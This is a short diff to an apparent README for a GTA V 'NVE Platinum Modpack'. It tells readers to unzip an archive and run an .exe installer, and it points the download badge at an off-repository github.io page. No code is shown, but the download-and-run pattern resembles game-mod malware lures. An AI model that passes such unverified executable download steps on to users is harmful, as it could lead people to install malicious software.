@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to automatically install the NVE Platinum Modpack into your GTA V directory.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://nve-platinum-modpack-gta5.github.io/.github/)
 
 ## 📸 Overview
 ![gta5-nve-lighting](https://github.com/user-attachments/assets/babe488c-45de-4710-bc84-dca5c734110d)
